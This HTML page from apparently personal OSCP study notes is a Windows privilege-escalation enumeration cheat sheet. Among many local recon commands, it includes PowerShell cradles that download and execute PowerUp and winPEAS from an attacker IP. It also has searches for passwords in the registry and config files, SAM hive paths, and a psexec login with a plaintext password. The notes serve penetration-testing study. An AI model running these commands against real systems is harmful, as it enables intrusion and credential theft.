@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>initial | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="initial" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="IMPORTANTE dir /r dir /A Get-ChildItem . -Force —" />
+<meta property="og:description" content="IMPORTANTE dir /r dir /A Get-ChildItem . -Force —" />
+<link rel="canonical" href="http://localhost:4000/4-win-privesc/1-initial/" />
+<meta property="og:url" content="http://localhost:4000/4-win-privesc/1-initial/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/4-win-privesc/1-initial/","headline":"initial","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"IMPORTANTE dir /r dir /A Get-ChildItem . -Force —","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item "><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item current"><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>win privesc</h2>
+				<h3>initial</h3>
+			</div>
+			<article class="content">
+				<blockquote>
+  <p><strong>IMPORTANTE</strong>  <br />
+dir /r<br />
+dir /A
+Get-ChildItem . -Force
+—</p>
+</blockquote>
+
+<h1 id="automatic-tools">Automatic tools</h1>
+<hr />
+<h2 id="1-powerup">1 powerup</h2>
+<h4 id="-from-file">| from file</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:&gt; powershell.exe -nop -exec bypass
+PS C:&gt; ./PowerUp.ps1
+PS C:&gt; Invoke-AllChecks
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:&gt; powershell.exe -nop -exec bypass
+PS c:&gt; Import-MOdule ./PowerUp.ps1
+PS c:&gt; Invoke-AllChecks
+</code></pre></div></div>
+<h4 id="-from-url">| from url</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe  -nop -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')"
+</code></pre></div></div>
+
+<h2 id="2-winpeas">2 winpeas</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\users\Administrator\Documents\wp.exe')"
+
+c:\users\kosts\Desktop&gt; .\wp.exe
+</code></pre></div></div>
+
+<h2 id="3-watson">3 watson</h2>
+<p>same as winpeas
+ 
+ </p>
+<h1 id="manual-info-gathering">Manual info gathering</h1>
+<hr />
+
+<h2 id="operating-system">Operating System</h2>
+
+<h4 id="-what-os-and-arch">| what os and arch?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
+wmic qfe
+</code></pre></div></div>
+
+<h4 id="-environment-variables">| environment variables</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem Env: | ft Key,Value
+</code></pre></div></div>
+<h4 id="-drives">| drives</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use
+wmic logicaldisk get caption, description, providername
+wmic logicaldisk get name
+wmic logicaldisk get caption
+diskpart
+list volume
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+
+get-psdrive -psprovider filesystem
+
+</code></pre></div></div>
+
+<h4 id="-mountmap">| mount/map</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\IP address\IPC$ "" /u:""
+net use \\192.168.1.101\IPC$ "" /u:""
+</code></pre></div></div>
+<p> 
+ </p>
+<h2 id="users">Users</h2>
+<h4 id="-whoami">| whoami</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+echo %USERNAME%
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$env:UserName
+</code></pre></div></div>
+<h4 id="-other-users">| other users</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net users
+net users /domain
+dir /b /ad "C:\Users\"
+dir /b /ad "C:\Documents and Settings\"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem c:\Users -Force | select Name
+</code></pre></div></div>
+
+<h4 id="-logged-in">| logged in?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qwinsta
+</code></pre></div></div>
+
+<h4 id="-groups">| groups</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-LocalGroup | ft Name
+</code></pre></div></div>
+
+<h4 id="-any-admin">| any admin?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup Administrators
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-LocalGroupMember Administrators | ft Name,PrincipalSource
+</code></pre></div></div>
+
+<h4 id="-registry-autologon">| registry autologon?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+</code></pre></div></div>
+<h4 id="-credential-manager">| Credential manager?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+</code></pre></div></div>
+<h4 id="-can-we-access-sam-and-system-">| can we access SAM and System ?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+</code></pre></div></div>
+
+<p> 
+ </p>
+<h2 id="programs-process-and-services">programs, process and services</h2>
+
+<h4 id="-what-is-installed">| what is installed?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+</code></pre></div></div>
+
+<h4 id="-any-weak-folder-or-file-permission">| any weak folder or file permission?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"
+</code></pre></div></div>
+<h4 id="-modify-permissions-for-everyone-or-users-on-program-folders">| Modify Permissions for Everyone or Users on Program Folders?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\*" 2&gt;nul | findstr "(M)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(M)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2&gt;nul | findstr "(M)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(M)" | findstr "BUILTIN\Users"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
+
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
+</code></pre></div></div>
+
+<h4 id="-accesschk--to-check-for-writeable-folders-and-files">| accesschk  to check for writeable folders and files.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk.exe -qwsu "Everyone" *
+accesschk.exe -qwsu "Authenticated Users" *
+accesschk.exe -qwsu "Users" *
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+</code></pre></div></div>
+
+<h4 id="-whats-running-ports">| whats running? ports?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /svc
+tasklist /v
+net start
+sc query
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+Get-Service
+</code></pre></div></div>
+<p>This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+</code></pre></div></div>
+<h4 id="-kill-a--process">| kill a  process</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>taskkill /PID 1532 /F
+</code></pre></div></div>
+
+<h4 id="-weak-service-permission">| weak service permission?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Users" *
+</code></pre></div></div>
+<h4 id="-are-there-any-unquoted-service-paths">| Are there any unquoted service paths?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i "Auto" 2&gt;nul |findstr /i /v "C:\Windows\\" 2&gt;nul |findstr /i /v """
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+</code></pre></div></div>
+<h4 id="-scheduled-tasks">| scheduled tasks?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
+dir C:\windows\tasks
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+</code></pre></div></div>
+<h4 id="-startup">| startup?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+</code></pre></div></div>
+
+<h4 id="-is-alwaysinstallelevated-enabled">| is alwaysinstallelevated enabled?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div></div>
+<p> 
+ </p>
+<h2 id="networking">networking</h2>
+<h4 id="-basic">| basic</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig /allows
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+</code></pre></div></div>
+<h4 id="-routes">| routes?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route print
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+</code></pre></div></div>
+
+<h4 id="-arp-cache">| arp cache?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp -a
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+</code></pre></div></div>
+<h4 id="-conection-to-others">| conection to others?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -ano
+</code></pre></div></div>
+<h4 id="-host-file">| host file?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\WINDOWS\System32\drivers\etc\hosts
+</code></pre></div></div>
+<h4 id="-firewall">| firewall?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export "firewall.txt"
+</code></pre></div></div>
+<h4 id="-more-interfaces">| more interfaces?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh dump
+</code></pre></div></div>
+<h4 id="-snmp-configurations">| snmp configurations?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+</code></pre></div></div>
+
+<h2 id="files-and-sensitive-information">Files and Sensitive Information</h2>
+<h4 id="-passwords-in-registry">| passwords in registry?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+</code></pre></div></div>
+
+<h4 id="-sysprep-or-unattended">| sysprep or unattended?</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+</code></pre></div></div>
+
+<h4 id="-iis">| IIS</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /a C:\inetpub\
+dir /s web.config
+dir /s *root.txt 2&gt;nul
+
+C:\Windows\System32\inetsrv\config\applicationHost.config
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+<h4 id="-iis-logs">| iis logs</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+</code></pre></div></div>
+
+<h4 id="-is-xampp-apache-or-php-installed-any-there-any-xampp-apache-or-php-configuration-files">| Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+<h4 id="-apache-logs">| apache logs?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s access.log error.log
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+</code></pre></div></div>
+<h4 id="-any-common-insta-win">| any common insta win?</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /s *pass* == *vnc* == *.config* 2&gt;nul
+findstr /si password *.xml *.ini *.txt *.config 2&gt;nul
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist
+systeminfo
+whoami /priv
+net users
+net user &lt;user&gt;
+ipconfig /all
+netstat -ano
+netsh firewall show state
+netsh firewall show config
+netsh advfirwall firewall show rule name=all
+schtasks /query /fo LIST /v
+</code></pre></div></div>
+
+<h4 id="-check-updates">| check updates</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn
+</code></pre></div></div>
+
+<ul>
+  <li>check configuration files who might store credentials
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+</code></pre></div>    </div>
+    <p> 
+ 
+ </p>
+    <h1 id="exploit-suggester">exploit suggester</h1>
+    <hr />
+  </li>
+</ul>
+
+<h2 id="from-kali-with-systeminfo">from kali with systeminfo</h2>
+<h4 id="-windows-exploit-suggester---next-generation">| Windows Exploit Suggester - Next Generation</h4>
+<p>https://github.com/bitsadmin/wesng</p>
+
+<h4 id="-windows-exploit-suggester">| Windows Exploit Suggester</h4>
+<p>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python /home/nikhil/scripts/windows-exploit-suggester.py -d 2016-07-02-mssb.xls -i systeminfo -l
+</code></pre></div></div>
+<p>-l : show only local exploits</p>
+
+<h2 id="from-box">from box</h2>
+<h4 id="--windows-privesc-check-v2">|  windows-privesc-check v2</h4>
+<p>https://github.com/pentestmonkey/windows-privesc-check</p>
+
+<p> 
+ </p>
+<h1 id="comands">comands</h1>
+<hr />
+<h4 id="-windows-admin-to-system-">| windows admin to system :</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PSEXEC.exe -i -s -d CMD
+</code></pre></div></div>
+<h4 id="-connect-remotely-psexec">| connect remotely psexec</h4>
+<p>temes credenciales y smb esta abierto? proba</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
+</code></pre></div></div>
+<h4 id="-add-admin-user-account">| add admin user account</h4>
